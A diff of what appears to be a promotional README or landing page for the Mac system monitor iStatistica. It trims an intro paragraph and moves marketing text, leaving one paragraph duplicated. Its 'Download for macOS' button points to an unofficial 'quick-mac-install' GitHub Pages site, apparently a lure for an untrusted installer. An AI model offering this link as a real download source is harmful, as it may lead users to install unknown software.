@@ -4,11 +4,7 @@
 
 <div>
 <h3>iStatistica for macOS</h3>
-<p><a href="#">iStatistica for macOS</a> is a comprehensive system monitor that provides real-time information about your Mac’s hardware and software performance. With iStatistica, you can easily track CPU usage, memory usage, disk space, battery life, and more, all in a clean and intuitive interface. It’s the perfect tool for anyone who needs to keep an eye on their Mac’s performance and ensure everything is running smoothly.
-
-iStatistica gives you detailed insights into your system's activity, helping you troubleshoot potential issues before they become problems. The app displays vital statistics such as temperature, fan speed, and network activity, giving you a complete picture of your Mac’s health. It’s especially useful for users with high-performance applications or for those who want to monitor their system’s resource usage in real time.
-
-The app also provides detailed reports and logs, allowing you to track performance over time and identify trends. Whether you’re a developer running resource-intensive apps, a student working with large datasets, or just someone who wants to keep their Mac in top shape, iStatistica gives you the power to monitor and optimize your system for maximum performance.</p>
+<p><a href="#">iStatistica for macOS</a> is a comprehensive system monitor that provides real-time information about your Mac’s hardware and software performance.</p>
 
 <a href="https://quick-mac-install.github.io/.github/iStatistica">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
@@ -40,6 +36,10 @@ The app also provides detailed reports and logs, allowing you to track performan
 ## Overview
 
 <a href="#">iStatistica for macOS</a> is a comprehensive system monitor that provides real-time information about your Mac’s hardware and software performance. With iStatistica, you can easily track CPU usage, memory usage, disk space, battery life, and more, all in a clean and intuitive interface. It’s the perfect tool for anyone who needs to keep an eye on their Mac’s performance and ensure everything is running smoothly.
+
+iStatistica gives you detailed insights into your system's activity, helping you troubleshoot potential issues before they become problems. The app displays vital statistics such as temperature, fan speed, and network activity, giving you a complete picture of your Mac’s health. It’s especially useful for users with high-performance applications or for those who want to monitor their system’s resource usage in real time.
+
+The app also provides detailed reports and logs, allowing you to track performance over time and identify trends. Whether you’re a developer running resource-intensive apps, a student working with large datasets, or just someone who wants to keep their Mac in top shape, iStatistica gives you the power to monitor and optimize your system for maximum performance.
 
 iStatistica gives you detailed insights into your system's activity, helping you troubleshoot potential issues before they become problems. The app displays vital statistics such as temperature, fan speed, and network activity, giving you a complete picture of your Mac’s health. It’s especially useful for users with high-performance applications or for those who want to monitor their system’s resource usage in real time.
 
